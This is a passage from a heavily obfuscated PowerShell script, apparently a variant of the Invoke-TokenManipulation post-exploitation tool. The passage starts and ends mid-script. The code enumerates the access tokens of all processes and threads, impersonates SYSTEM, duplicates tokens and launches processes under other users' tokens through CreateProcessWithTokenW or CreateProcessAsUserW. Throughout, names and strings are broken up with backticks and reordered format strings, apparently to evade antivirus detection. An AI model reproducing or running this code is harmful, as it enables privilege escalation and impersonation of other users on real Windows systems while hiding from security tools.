                                &("{3}{0}{2}{1}"-f'ite-Warn','ng','i','Wr') ('C'+'all '+'to'+' '+'L'+'ookup'+'PrivilegeNam'+'eW '+'fail'+'e'+'d. '+'Er'+'ror '+'co'+'de: '+"$ErrorCode. "+'Real'+'S'+'ize: '+"$PrivilegeNameSize")
                            }
                            ${p`RiVIleGE`N`Ame} =  ( &('GI') ("vARIab"+"Le:"+"3"+"10wC")).vAlue::("{2}{1}{0}{3}"-f 'g','ToStrin','Ptr','Uni').Invoke(${pRiVIl`e`G`enamE`Ptr})

                            
                            ${pRiv`iLe`G`EstA`TUS} = ""
                            ${EN`Ab`LED} = ${Fa`lSE}

                            if (${Lu`IDAnDA`TTri`BUTe}."At`TrIbUt`eS" -eq 0)
                            {
                                ${E`Nab`lEd} = ${f`AlsE}
                            }
                            if ((${Lu`I`danda`T`Tr`IBuTe}."At`Tr`iBUtes" -band ${WIn`32cO`NsT`An`Ts}."Se_`prIvi`l`E`g`E`_eNAbLEd_`By_`deFauLT") -eq ${W`in`32coNst`AntS}."s`E_PrIvIL`Eg`E_`enAblED`_bY_`D`eFa`u`lt") 
                            {
                                ${e`N`AbLed} = ${tR`UE}
                            }
                            if ((${lUiD`A`NDat`TR`IbUte}."a`TTR`IBUteS" -band ${W`In`32coN`S`TANtS}."Se`_priv`IlEge`_eNAB`leD") -eq ${wI`N32coN`StAn`TS}."se_pr`ivILe`Ge_e`Nab`lEd") 
                            {
                                ${E`NAb`led} = ${T`RUE}
                            }
                            if ((${l`UidAn`DattRi`B`utE}."aTTR`i`ButES" -band ${wI`N`32CON`StAn`TS}."se`_p`RIv`i`lEGE_`REM`oVeD") -eq ${wIN3`2c`oNsta`NTs}."sE`_`pRiVI`leg`E_ReMOveD") 
                            {
                                &("{3}{2}{4}{1}{0}" -f 'ng','i','rite-W','W','arn') ("{21}{8}{1}{4}{7}{16}{10}{2}{11}{24}{20}{0}{6}{13}{19}{18}{17}{15}{5}{14}{22}{25}{23}{3}{9}{12}" -f'IL','a','und a toke','s as a bu','v','a','EGE_','io',' beh','g',' Fo','n wit','. ','REMOVE','s','e','r:','l','P','D. ','RIV','Unexpected','e ','ort thi','h SE_P','rep')
                            }

                            if (${ENa`BLEd})
                            {
                                ${R`etu`RnoBj}."P`Ri`VIlEgeSen`ABLEd" += ,${PRivilE`g`Ena`ME}
                            }
                            else
                            {
                                ${r`EtUr`NO`Bj}."p`RivILeges`AVaiL`AB`LE" += ,${P`RI`Vi`L`EGenAmE}
                            }

                             $310Wc::("{0}{1}{3}{2}"-f 'Fre','eH','l','Globa').Invoke(${pRIvILEgen`A`mE`P`TR})
                        }
                    }
                     ( &("{0}{1}" -f'Di','r')  ('vaRIab'+'l'+'e:310W'+'c') ).vaLue::("{0}{3}{2}{1}"-f'F','bal','lo','reeHG').Invoke(${ToK`EN`priVI`LEg`EsP`Tr})

                }
                else
                {
                    &("{0}{1}{2}" -f 'Write-','Verbo','se') "Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data. $($LogonSessionData.UserName.Length) "
                }

                
                ${NtS`TA`Tus} = ${lsAFRee`RE`TuRnBUf`FeR}."IN`VOkE"(${L`oGON`Se`SsIOnDatAp`Tr})
                ${log`on`SESs`IOndAtaPtr} =   ( &("{1}{0}" -f'ARIAble','V') ('0'+'g4tvz') -valuEonL )::"z`Ero"
                if (${nTS`TA`TuS} -ne 0)
                {
                    &("{1}{0}{2}" -f'rn','Write-Wa','ing') ('Call'+' '+'t'+'o '+'Ls'+'aFr'+'eeReturnB'+'uffe'+'r '+'faile'+'d'+'. '+'Err'+'o'+'r '+'c'+'od'+'e: '+"$ntstatus")
                }
            }

              ( &("{2}{0}{1}"-f 'DI','TEm','CHil')  ("{3}{1}{2}{0}"-f'310WC','a','riaBLe:','V') ).VaLuE::("{2}{1}{0}"-f'l','reeHGloba','F').Invoke(${lUid`p`TR})
            ${LU`id`PTR} =  (&("{2}{0}{1}" -f'RI','aBle','Get-VA')  ("0G"+"4TvZ") -vAL )::"Ze`RO"
        }

          (  &("{1}{0}"-f'eM','IT') ("{3}{1}{2}{0}" -f'C',':3','10w','vAriablE')).ValUe::("{1}{3}{0}{2}" -f 'lob','Free','al','HG').Invoke(${tOKE`N`StA`TSpTR})
        ${TOKE`N`sT`Ats`ptR} =  ( &("{1}{0}"-f 'em','It') ("{2}{3}{1}{0}" -f 'Ble:0G4TVz','a','var','i') ).VAlUe::"Z`eRo"

        return ${ReT`U`RnOBj}
    }


    
    function Ge`T-unIq`Uet`OKenS
    {
        Param(
            [Parameter(POSitION=0, MAnDatORY=${Tr`Ue})]
            [Object[]]
            ${AlLToK`e`NS}
        )

        ${T`O`K`ENbYUsER} = @{}
        ${TokeNbYEN`A`B`LEdpRiV} = @{}
        ${to`kEN`B`YAVa`IlAbLEpr`IV} = @{}

        
        foreach (${t`oken} in ${aL`ltO`KEnS})
        {
            ${K`Ey} = ${to`K`en}."Do`maIN" + "\" + ${t`Ok`en}."uSEr`N`AmE"
            if (-not ${T`OKEnB`Yus`Er}.("{2}{1}{0}" -f'ey','ainsK','Cont').Invoke(${K`eY}))
            {
                
                
                if (${T`oKEN}."log`ontY`pE" -ne 3 -and
                    ${t`ok`En}."USer`NA`me" -inotmatch "^DWM-\d+$" -and
                    ${TO`ken}."uSE`RnA`mE" -inotmatch "^LOCAL\sSERVICE$")
                {
                    ${T`ok`eNbYUS`er}.("{1}{0}"-f 'dd','A').Invoke(${k`EY}, ${ToK`En})
                }
            }
            else
            {
                
                if(${T`OkEn}."Isel`eV`AT`ed" -eq ${t`O`Kenbyu`SEr}[${K`ey}]."i`s`elEv`ATeD")
                {
                    if ((${t`o`kEN}."pRivIL`EgE`Sen`ABLed"."Co`uNT" + ${TO`K`eN}."pR`IvILEg`E`S`AVAILaBlE"."C`oUNt") -gt (${TOK`eNb`yuSeR}[${k`Ey}]."PR`iVILeG`e`sEnAbL`eD"."Co`uNT" + ${T`OKEnBy`uS`ER}[${K`ey}]."Priv`IlE`gESav`A`ilabLE"."c`OUnt"))
                    {
                        ${t`Ok`e`NBYUSer}[${k`ey}] = ${To`kEN}
                    }
                }
                
                elseif ((${TOk`En}."Ise`l`evAT`ed" -eq ${t`Rue}) -and (${tO`Ke`NByuser}[${K`EY}]."I`seLEVAt`Ed" -eq ${f`ALse}))
                {
                    ${ToK`eN`By`uSer}[${k`EY}] = ${tO`kEn}
                }
            }
        }

        
        foreach (${TO`k`eN} in ${a`LLtOk`ENS})
        {
            ${Ful`LNA`ME} = "$($Token.Domain)\$($Token.Username)"

            
            foreach (${Privi`Le`GE} in ${t`oken}."p`RI`VI`lEGeSe`NAbLeD")
            {
                if (${toK`E`NByenab`l`Ed`priv}.("{3}{1}{0}{2}" -f 'Ke','s','y','Contain').Invoke(${p`RiVIle`gE}))
                {
                    if(${TOken`Bye`NAblEdpr`iV}[${pr`i`VI`lege}] -notcontains ${f`ULlName})
                    {
                        ${tOkeN`B`yENaBl`edPRIv}[${p`R`I`VIlEgE}] += ,${fU`l`lname}
                    }
                }
                else
                {
                    ${TOk`eNb`Yena`B`le`dprIV}.("{1}{0}"-f'd','Ad').Invoke(${pR`IViLe`GE}, @(${Ful`LnA`me}))
                }
            }

            
            foreach (${prIV`ILE`GE} in ${t`Ok`en}."PrIV`ILeGE`SaVAIL`AbLE")
            {
                if (${T`o`KENBYA`VailABL`EPRIv}.("{1}{2}{0}"-f 'ey','Cont','ainsK').Invoke(${P`R`ivILeGE}))
                {
                    if(${To`Ke`NByaVA`i`laBl`E`PRIV}[${pr`iv`IlEGE}] -notcontains ${FULL`NA`mE})
                    {
                        ${t`oKenbYAV`A`il`ABL`EPriV}[${p`R`IVileGe}] += ,${full`N`AmE}
                    }
                }
                else
                {
                    ${ToKeNB`YAv`Ai`LA`BlEP`RiV}.("{1}{0}"-f 'dd','A').Invoke(${PRivI`L`EgE}, @(${F`Ul`l`NaME}))
                }
            }
        }

        ${R`EtU`Rnd`IcT} = @{
            ("{1}{0}{2}"-f 'Us','TokenBy','er') = ${tokEn`B`yUSER}
            ("{2}{0}{1}{3}{4}"-f 'ke','nByE','To','nable','dPriv') = ${ToKENby`ENAblE`D`P`RiV}
            ("{3}{0}{4}{2}{1}{6}{5}" -f 'oken','l','ilab','T','ByAva','riv','eP') = ${t`O`kEnB`YAvail`AbL`EPriv}
        }

        return (&("{0}{2}{1}"-f 'New-O','t','bjec') ("{0}{2}{1}"-f 'P','ect','SObj') -Property ${R`etur`NdIcT})
    }


    function InV`OK`e-i`MPERS`ONAteUS`er
    {
        Param(
            [Parameter(PosiTIon=0, manDAtorY=${T`RUE})]
            [IntPtr]
            ${HTO`k`EN}
        )

        
        [IntPtr]${N`eW`htoKen} =   ( &("{0}{2}{3}{1}{4}"-f'get','hil','-','c','diteM')  ("{3}{1}{2}{0}"-f 'VZ','G','4t','VarIable:0') ).vAlue::"z`ERo"
        ${S`UCc`EsS} = ${D`Up`lIcAtEt`o`K`enEX}."inVO`Ke"(${Hto`k`En}, ${WiN`32`c`oNstaNts}."ma`xiMum_AL`L`OWeD",   $0G4tvZ::"zE`RO", 3, 1, [Ref]${neWH`Tok`En}) 
        if (-not ${s`u`CcESs})
        {
            ${E`RR`O`RcOde} =   (  &("{4}{3}{2}{0}{1}"-f'-CH','ilditem','t','E','G') ("{1}{3}{2}{0}" -f 'C','Va','iabLe:310w','r') ).ValuE::("{0}{2}{3}{5}{4}{1}" -f'GetLas','r','t','Win','rro','32E').Invoke()
            &("{0}{3}{2}{1}"-f 'Write-','ing','n','War') ('Du'+'pl'+'icateT'+'ok'+'enEx '+'fail'+'ed. '+'Error'+'C'+'ode: '+"$ErrorCode")
        }
        else
        {
            ${S`uCCesS} = ${IMpeRS`OnaTeLOG`GEdOn`U`sEr}."INV`O`KE"(${N`e`WHtokEn})
            if (-not ${sUcC`E`Ss})
            {
                ${eRr`o`Rc`Ode} =  (  &('gI') ("varI"+"Ab"+"L"+"E:310wC")  ).valUe::("{3}{0}{2}{4}{1}" -f 'tLa','r','stWin3','Ge','2Erro').Invoke()
                &("{2}{3}{0}{1}"-f'a','rning','Wr','ite-W') ('F'+'ailed '+'t'+'o '+'Impe'+'rsona'+'t'+'eL'+'ogged'+'O'+'nUser. '+'Error'+' '+'cod'+'e: '+"$Errorcode")
            }
        }

        ${sU`C`cess} = ${cLoS`EHaNd`Le}."Inv`OkE"(${ne`W`HTOK`en})
        ${nE`W`HtokeN} =  (  &("{2}{1}{3}{0}"-f'LE','t-vaR','ge','IAb') ("{1}{0}" -f 'vz','0G4t')  -vAl)::"z`ero"
        if (-not ${S`ucc`Ess})
        {
            ${E`RrO`RCodE} =  (  &("{1}{0}{2}"-f'hilDItE','C','m') ("v"+"ARIaB"+"le:31"+"0w"+"c")  ).vALUE::("{0}{2}{1}{3}" -f'G','astWin32Er','etL','ror').Invoke()
            &("{1}{2}{0}{3}" -f'Wa','Write','-','rning') ('C'+'lose'+'Ha'+'ndle '+'fa'+'ile'+'d '+'to'+' '+'clos'+'e '+'Ne'+'w'+'HToken. '+'E'+'rrorCod'+'e: '+"$ErrorCode")
        }

        return ${SUCC`EsS}
    }


    function Cr`e`ATE-pRoc`E`sSWitHtOken
    {
        Param(
            [Parameter(pOSiTIOn=0, MANDATorY=${tr`UE})]
            [IntPtr]
            ${Hto`k`eN},

            [Parameter(pOsITIon=1, MandATOry=${Tr`UE})]
            [String]
            ${pr`OC`esSName},

            [Parameter(POSitioN=2)]
            [String]
            ${pr`OCe`ssaRgs},

            [Parameter(PosItION=3)]
            [Switch]
            ${PA`s`stHru}
        )
        &("{1}{2}{0}" -f 'rbose','Writ','e-Ve') ("{0}{7}{1}{3}{8}{2}{4}{6}{5}"-f 'E','ing Cr','ocessWit','eat','h','oken','T','nter','e-Pr')
        
        [IntPtr]${neW`HT`O`ken} =   $0G4TVZ::"Z`ERO"
        ${Su`CCeSS} = ${d`UPlI`c`AtETOKEneX}."I`NVo`KE"(${ht`OkeN}, ${WI`N`32c`ONSTAntS}."Maxi`MUM`_allO`wEd",  $0G4tvZ::"zE`RO", 3, 1, [Ref]${n`e`WhtokEN})
        if (-not ${s`UcCESs})
        {
            ${E`R`ROr`CoDe} =  (&("{1}{0}" -f 'IR','D') ("{1}{2}{0}{4}{3}"-f 'BL','V','ARia',':310wC','E')).vAlUE::("{0}{3}{1}{4}{5}{2}" -f'G','tW','Error','etLas','i','n32').Invoke()
            &("{3}{1}{2}{0}" -f'ng','rite-Wa','rni','W') ('Dupl'+'i'+'cateTo'+'kenE'+'x '+'faile'+'d.'+' '+'ErrorCod'+'e:'+' '+"$ErrorCode")
        }
        else
        {
            ${sta`RTu`pin`Fo`s`iZe} =  ( &("{1}{0}" -f'Ir','D')  ("{0}{2}{1}"-f 'VAriABlE','310wC',':') ).ValUe::"s`IzEof"([Type]${S`TArTUpiN`FO})
            [IntPtr]${sTaRt`U`PIN`Fo`Ptr} =  ( &("{2}{1}{0}" -f 'le','rIaB','vA') ("{1}{0}"-f'c','310W') -vA)::("{1}{2}{0}"-f'bal','A','llocHGlo').Invoke(${sTaR`TU`PIN`FOs`iZE})
            ${mEm`s`et}."I`NvokE"(${sTARTUp`i`N`F`opTr}, 0, ${st`Ar`TUpi`NfosI`ze}) | &("{2}{1}{0}" -f'ull','t-N','Ou')
             ( &('lS')  ("{0}{1}{2}" -f'VArIa','blE:310W','c')  ).vALue::("{0}{1}{2}"-f'Wr','iteInt','32').Invoke(${starT`UpInfop`TR}, ${sT`ARTUPi`N`FoSi`zE}) 

            ${Pr`O`c`EsSInfOSizE} =   ( &("{2}{0}{1}"-f 'I','ABle','var') ("{1}{0}" -f'10wc','3')  -VaLuE )::"SiZE`Of"([Type]${PrO`C`es`s_inf`ORMaT`Ion})
            [IntPtr]${PROC`E`ssINfoptr} =  $310wC::("{1}{0}{2}" -f 'HGlob','Alloc','al').Invoke(${procESsiN`F`os`I`ze})

            ${PrOCe`S`SnAme`PTr} =  $310WC::("{0}{5}{3}{2}{1}{4}"-f'S','alU','b','o','ni','tringToHGl').Invoke("$ProcessName")
            ${p`RO`C`eSSarGSP`Tr} =   (&("{2}{0}{1}" -f 'IAb','LE','vAr') ("{0}{2}{1}"-f'0','4TVZ','g') -vALUEon  )::"Z`eRO"
            if (-not   (  &("{1}{2}{0}"-f'E','VARiaB','l')  ("{0}{1}"-f'Z6','CV1') -val )::("{3}{2}{1}{0}"-f'lOrEmpty','l','sNu','I').Invoke(${P`R`o`CeSSargs}))
            {
                ${pro`C`ESs`ARGS`PTr} =   $310wC::("{1}{2}{3}{0}"-f'ni','StringToHGlo','bal','U').Invoke(("`"$ProcessName`" "+"$ProcessArgs"))
            }
            
            ${fUNcT`i`o`Nn`AMe} = ""
            if ( $JgP::("{2}{0}{1}{3}"-f 'rren','tProc','GetCu','ess').Invoke()."sES`s`iO`NId" -eq 0)
            {
                
                
                
                &("{1}{0}{4}{2}{3}"-f'e-V','Writ','s','e','erbo') ("{15}{5}{12}{18}{21}{26}{11}{16}{8}{23}{20}{14}{7}{13}{10}{4}{17}{9}{2}{6}{24}{25}{19}{3}{1}{0}{22}"-f'te ','erna','c',' alt','eProcessAsUser','nning in ','r','imaryTok','S','o ','ling Creat','nabl','Session','enPrivilege and cal','gnPr','Ru','ing ','W t',' 0','ss with','i','.','token.','eAss','eate',' a proce',' E')
                &("{0}{2}{4}{3}{1}{5}" -f 'Enabl','g','e-P','ile','riv','e') -Privilege ("{5}{0}{2}{4}{3}{1}"-f 'AssignPrimary','ge','TokenPr','ile','iv','Se')
                ${Suc`Cess} = ${cREA`T`E`pro`ceSSA`suSErW}."INv`o`ke"(${n`eW`htOken}, ${Pr`oceS`sName`PtR}, ${pRo`CeSSar`gSPtR},   ( &('Gi')  ('VARIaBl'+'E:0G4'+'tVz')  ).VaLue::"zE`Ro",  $0G4tVz::"zE`Ro", ${Fa`l`se}, 0,   ( &("{1}{0}{2}" -f 'ia','VAR','Ble') ("{1}{0}"-f '4tvz','0G')  -VALueON  )::"ZE`RO",   (&("{2}{1}{0}" -f'IablE','AR','V') ("0g4TV"+"Z")  -vAlUEonl  )::"z`eRo", ${S`TA`RTUp`InfoP`TR}, ${ProceSS`iNF`oPtr})
                ${FuN`Ct`i`o`NNaMe} = ("{3}{0}{4}{5}{1}{2}"-f'ea','essAsU','serW','Cr','tePr','oc')
            }
            else
            {
                &("{0}{1}{2}{3}" -f'Writ','e-Ver','bo','se') ("{13}{11}{2}{14}{18}{3}{21}{27}{1}{25}{7}{10}{23}{20}{28}{22}{16}{26}{15}{5}{8}{19}{9}{24}{17}{4}{6}{12}{0}" -f'ken.',' Cre','g in S','ion 0','t','roc','e ','r','ess w','e','oces','unnin','to','Not r','es',' a p',' cre','na','s','ith alt','ithToke',', cal','W to','sW','r','ateP','ate','ling','n')
                ${Suc`C`eSS} = ${CREatEPR`o`ceS`SwiTHTo`K`eNw}."InV`Oke"(${N`EWh`ToKen}, 0x0, ${p`RocESS`N`AMePtr}, ${p`RO`C`eS`SArgSPtr}, 0,   ( &("{3}{0}{1}{2}"-f'T','-','VAriAble','ge')  ('0g4t'+'VZ') ).ValuE::"Z`ErO",   (  &("{1}{2}{0}" -f'blE','vAr','IA') ("{0}{1}" -f'0g','4tvz') -Va)::"z`Ero", ${S`Ta`RTuPInf`OptR}, ${PRocE`S`Si`N`FOpTR})
                ${FUNCt`i`o`NName} = ("{5}{1}{6}{4}{7}{3}{2}{0}"-f'W','e','n','thToke','roc','Cr','ateP','essWi')
            }
            if (${Succ`E`SS})
            {
                
                ${p`R`o`ceSsinfo} =  $310wc::"pTr`Tos`T`Ruc`TuRe"(${pro`CE`SSinF`opTr}, [Type]${p`Roc`EsS_Inf`ORmaTi`oN})
                ${c`los`eHAnDlE}."inv`OKE"(${prO`C`EsSIN`Fo}."hPROC`ess") | &("{0}{1}{2}" -f 'Out-','Nul','l')
                ${CLOsE`ha`Nd`le}."INvO`ke"(${PRocesS`i`N`Fo}."HThr`e`AD") | &("{1}{0}{2}" -f 'ul','Out-N','l')

		
		if (${PaS`Sth`Ru}) {
			
			${R`EtUrNP`R`O`CEsS} = &("{1}{3}{0}{2}" -f '-','G','Process','et') -Id ${pRoCe`SS`INfO}."D`WPRoC`es`SID"

			
			${N`uLl} = ${rEtU`R`NPrOCEsS}."H`AnD`lE"

			
			${r`et`urNPro`cESS}
		}
            }
            else
            {
                ${ErRo`Rco`DE} =  ( &('ls')  ("{2}{1}{0}{3}"-f 'le','RIaB','VA',':310WC') ).VAlUE::("{1}{2}{5}{3}{4}{0}"-f'rror','Ge','t','stWin3','2E','La').Invoke()
                &("{0}{2}{1}"-f 'Writ','Warning','e-') ("$FunctionName "+'fa'+'iled'+'. '+'Erro'+'r'+' '+'co'+'de:'+' '+"$ErrorCode")
            }

            
             $310WC::("{1}{0}{2}" -f'eH','Fre','Global').Invoke(${sT`A`RTUpiNfOpTR})
            ${stArTUPIN`F`o`pTr} =   (&("{1}{0}{3}{2}" -f'-VaR','GEt','Le','iaB') ('0G4T'+'Vz')  ).ValUe::"z`ERo"
             $310Wc::("{3}{2}{0}{1}"-f'lo','bal','G','FreeH').Invoke(${PRO`cESsi`NFo`p`Tr})
            ${p`ROCeSS`I`NFoPTR} =   ( &("{0}{2}{1}" -f'g','IaBle','et-VAr')  ("{1}{0}" -f 'G4TVz','0')  -VAluE)::"Z`ErO"
              (  &("{0}{2}{1}"-f 'CHI','ditem','L') ('Va'+'r'+'Iab'+'Le:310wc')  ).VALue::("{8}{6}{7}{2}{4}{3}{0}{1}{5}"-f 'l','locUnico','o','alA','b','de','eeG','l','ZeroFr').Invoke(${P`RocE`ss`N`AMePTR})
            ${ProcEsS`N`AmEp`Tr} =   (&("{1}{0}"-f'R','DI')  ("{0}{3}{2}{1}"-f 'Var','TvZ','lE:0g4','iaB')  ).vAluE::"Ze`Ro"

            
            ${s`UCCe`sS} = ${C`L`OseH`Andle}."Inv`OkE"(${n`ew`hTOken})
            ${NeWhtO`K`En} =  $0G4TVZ::"z`ERo"
            if (-not ${suCCE`sS})
            {
                ${eRr`o`RCoDe} =  (  &("{1}{0}"-f 'bLE','VarIa')  ("{1}{0}"-f 'Wc','310')  -VaLue)::("{3}{0}{4}{1}{2}"-f 'astWin3','Erro','r','GetL','2').Invoke()
                &("{3}{2}{0}{4}{1}"-f 'W','rning','te-','Wri','a') ('Close'+'Ha'+'ndle'+' '+'f'+'aile'+'d '+'to'+' '+'close'+' '+'NewH'+'Tok'+'en. '+'ErrorCo'+'de:'+' '+"$ErrorCode")
            }
        }
    }


    function fR`Ee-aL`lTO`KE`Ns
    {
        Param(
            [Parameter(PosiTION=0, MANdAToRY=${Tr`ue})]
            [PSObject[]]
            ${TO`keninfoo`BJs}
        )

        foreach (${O`Bj} in ${T`Oke`NiNFOOBjs})
        {
            ${Suc`CeSS} = ${ClO`SE`HaND`lE}."in`VokE"(${o`BJ}."hTO`kEn")
            if (-not ${S`uC`cESs})
            {
                ${Er`Rorco`DE} =  (  &("{1}{0}{2}"-f'ET','g','-ITem')  ("{4}{1}{3}{0}{2}"-f 'W','riABlE','C',':310','vA')  ).vALUe::("{2}{1}{0}{3}" -f 'Win32Er','st','GetLa','ror').Invoke()
                &("{0}{2}{1}" -f 'Wri','e','te-Verbos') ('F'+'ailed'+' '+'t'+'o '+'close'+' '+'toke'+'n '+'han'+'dle '+'i'+'n '+'Free'+'-AllTo'+'k'+'ens'+'. '+'Err'+'o'+'rCode: '+"$ErrorCode")
            }
            ${o`BJ}."ht`oKen" =  $0g4tVZ::"z`ERO"
        }
    }


    
    function EnU`M`-`A`LltoKeNS
    {
        ${aL`LTO`KeNs} = @()

        
        
        
        [string]${L`ocA`lsystE`m`NTaccount} = (&("{1}{2}{0}" -f 'bject','New-','O') -TypeName ("{4}{10}{7}{1}{3}{0}{5}{2}{8}{9}{6}"-f 'nc','Pr','uri','i','S','ipal.Sec','Identifier','m.Security.','t','y','yste') -ArgumentList ( (  &("{0}{2}{1}" -f'VA','bLE','rIA') ("{1}{0}" -f '29','q8MG')  -vaLUeoNly  )::("{0}{3}{1}{4}{2}"-f'L','lS','id','oca','ystemS'), ${nU`ll}))."tRA`NS`latE"([Security.Principal.NTAccount])."VaL`Ue"
        
        ${s`yStE`mTOk`ENS} = &("{2}{0}{3}{1}" -f'et','WmiObject','G','-') -Class ("{4}{1}{0}{3}{2}"-f 'roc','n32_P','s','es','Wi') | &("{1}{0}{2}" -f 'orEach-Ob','F','ject') {
            ${owN`e`Rin`FO} = ${_}.("{1}{0}{2}"-f 'e','GetOwn','r').Invoke()

            if (${o`wne`RINfO}."DO`main" -and ${OW`NeR`iNfO}."u`ser") {
                ${O`WNERstR`I`Ng} = "$($OwnerInfo.Domain)\$($OwnerInfo.User)".("{2}{0}{1}"-f 'o','Upper','T').Invoke()

                if (${O`wnerStR`iNg} -eq ${L`Oca`l`syS`TemNtACc`OU`NT}.("{0}{2}{1}"-f 'T','pper','oU').Invoke()) {
                    ${_}
                }
            }
        }

        ForEach (${sY`stEmTOK`EN} in ${SYs`T`e`mToKenS})
        {
            ${S`YS`TEmtOke`NiNfo} = &("{2}{4}{0}{3}{1}"-f 'i','ryToken','Get','ma','-Pr') -ProcessId ${SYSte`m`ToKEN}."p`ROCeS`SID" -WarningAction ("{0}{1}{2}{3}"-f'S','ilentl','yC','ontinue') -ErrorAction ("{1}{0}{4}{2}{3}" -f 'ilently','S','i','nue','Cont')
            if (${S`Y`ste`mTokEninFO}) { break }
        }
        if (${SYsTEmtO`keN`in`Fo} -eq ${nU`ll} -or (-not (&("{3}{5}{1}{4}{2}{6}{0}" -f 'er','e','erson','In','-Imp','vok','ateUs') -hToken ${sySTe`mT`okeNi`N`FO}."h`PROct`okEn")))
        {
            &("{0}{1}{2}{3}"-f'Writ','e','-Warn','ing') ("{21}{17}{0}{7}{5}{13}{2}{22}{16}{3}{11}{6}{8}{9}{15}{19}{20}{12}{1}{14}{18}{4}{10}" -f' t','m','s','t ',' ','EM','il','o impersonate SYST','l not ','be','tokens','w','u',', the ','erat',' ab','rip','e','e all','le to',' en','Unabl','c')
        }

        if (${SYS`TemTO`K`eni`NFO} -ne ${NU`ll} -and ${sY`ste`mto`k`enin`FO}."HpRo`ctO`kEN" -ne   ( &("{0}{1}{2}{3}" -f'geT-v','ARIa','b','lE') ("{2}{0}{1}"-f 'G4Tv','z','0')).ValuE::"Z`erO")
        {
            ${CLo`S`EhAnd`le}."in`VOke"(${sYS`TeM`Tok`e`NINfo}."h`p`ROct`oKEN") | &("{2}{0}{1}" -f'N','ull','Out-')
            ${sYst`EMtoKENi`N`FO} = ${N`uLl}
        }

        ${PR`ocEs`SI`dS} = &("{1}{2}{0}" -f'ss','get-pr','oce') | &("{1}{0}" -f 're','whe') {${_}."N`AMe" -inotmatch "^csrss$" -and ${_}."N`AMe" -inotmatch "^system$" -and ${_}."Id" -ne 0}

        
        foreach (${P`ROc`ESs} in ${prOC`eS`s`iDS})
        {
            ${pr`im`ArYToKE`NInFo} = (&("{4}{2}{1}{3}{0}"-f 'ken','ryT','a','o','Get-Prim') -ProcessId ${PRO`ce`ss}."i`D" -FullPrivs)

            
            if (${Pri`marYt`okEN`iNFo} -ne ${Nu`Ll})
            {
                [IntPtr]${hTOk`en} = [IntPtr]${P`R`IMAry`TOKe`NinFO}."Hp`Ro`cTOKEn"

                if (${h`TO`KEn} -ne   $0g4tVz::"ze`RO")
                {
                    
                    ${REtU`RnO`BJ} = &("{1}{3}{0}{2}"-f'nInformat','Get-','ion','Toke') -hToken ${hTo`K`en}
                    if (${RE`TurNO`BJ} -ne ${Nu`LL})
                    {
                        ${Re`Tu`RnoBj} | &("{0}{1}{2}" -f'Ad','d-Memb','er') -MemberType ("{2}{1}{3}{0}"-f 'perty','o','N','tePro') -Name ("{1}{0}{2}"-f's','Proces','Id') -Value ${pROC`ESs}."Id"

                        ${Al`l`TOkENS} += ${RE`T`U`RNoBj}
                    }
                }
                else
                {
                    &("{4}{0}{1}{2}{3}" -f'te','-War','ni','ng','Wri') "Couldn't retrieve token for Process: $($Process.Name). ProcessId: $($Process.Id) "
                }

                foreach (${t`HReaD} in ${pro`CE`SS}."th`ReadS")
                {
                    ${T`hReADTOk`En`INFO} = &("{1}{3}{0}{4}{2}" -f'adT','Get-','n','Thre','oke') -ThreadId ${th`RE`AD}."id"
                    [IntPtr]${H`TOkEn} = (${t`Hr`EaDToK`En`iNfo}."hThR`ea`Dto`keN")

                    if (${hTo`kEn} -ne  (  &("{2}{1}{0}" -f'Able','-vaRi','geT') ('0G4T'+'vZ') -vaLU  )::"ZE`Ro")
                    {
                        ${reTUR`N`ObJ} = &("{0}{4}{2}{3}{1}"-f 'G','ion','ma','t','et-TokenInfor') -hToken ${H`T`OkEN}
                        if (${RET`u`RnOBJ} -ne ${NU`ll})
                        {
                            ${rEtu`RN`OBj} | &("{0}{1}{2}"-f'Ad','d-','Member') -MemberType ("{1}{2}{0}"-f 'y','N','otePropert') -Name ("{1}{0}"-f'hreadId','T') -Value ${T`hreAd}."Id"
                    
                            ${aLlt`Ok`eNs} += ${R`Etu`R`NobJ}
                        }
                    }
                }
            }
        }

        return ${AL`Lt`okENS}
    }


    function inVoke`-`R`EVErTtosElF
    {
        Param(
            [Parameter(PosItION=0)]
            [Switch]
            ${ShO`WOUt`P`Ut}
        )

        ${SuC`C`eSs} = ${Re`Ve`R`TToSE`lf}."In`V`OKE"()

        if (${S`hoWOUt`p`ut})
        {
            if (${SUCc`E`Ss})
            {
                &("{2}{3}{1}{0}" -f'tput','u','Wri','te-O') "RevertToSelf was successful. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName) "
            }
            else
            {
                &("{0}{1}{2}{3}" -f 'Wri','te-Ou','tpu','t') "RevertToSelf failed. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName) "
            }
        }
    }


    
    function Ma`iN
    {
        if (-not ([Security.Principal.WindowsPrincipal]   $TA5L::("{0}{2}{1}"-f'G','Current','et').Invoke())."I`S`InROLe"([Security.Principal.WindowsBuiltInRole] ("{2}{0}{1}" -f't','rator','Adminis')))
        {
            &("{3}{2}{1}{0}" -f 'ror','r','E','Write-') ("{8}{2}{3}{0}{9}{1}{6}{10}{7}{4}{5}"-f'ust ','run as ad','ipt ','m','ra','tor','mi','t','Scr','be ','nis') -ErrorAction ("{0}{1}"-f 'Sto','p')
        }

        
        if ( $jGP::("{0}{1}{4}{3}{2}" -f 'G','etC','cess','o','urrentPr').Invoke()."seS`SI`ONId" -eq 0)
        {
            &("{0}{2}{1}"-f'Writ','erbose','e-V') ("{14}{16}{11}{10}{17}{7}{5}{19}{0}{8}{18}{13}{21}{4}{9}{20}{1}{15}{2}{6}{12}{3}"-f 'I ','a','o',' UI)','ession ','ing N','t have ','orc','(','0 ','on','Sessi','a',' ','Ru','nn','nning in ',' 0, f','processes','oU','c','in S')
            ${n`OuI} = ${T`RUe}
        }

        if (${pSCm`dl`ET}.paramETeRseTnaMe -ieq ("{0}{2}{1}" -f'RevT','f','oSel'))
        {
            &("{4}{3}{2}{0}{1}" -f'oSel','f','rtT','nvoke-Reve','I') -ShowOutput
        }
        elseif (${P`scMD`LEt}.paRAMEtERsetname -ieq ("{2}{1}{3}{0}" -f's','ce','CreatePro','s') -or ${p`Sc`mdleT}.PARameTERSETnAmE -ieq ("{1}{2}{0}{3}{4}"-f 'teU','Imperso','na','s','er'))
        {
            ${all`Tok`eNs} = &("{0}{1}{4}{2}{3}" -f'En','u','n','s','m-AllToke')
            
            
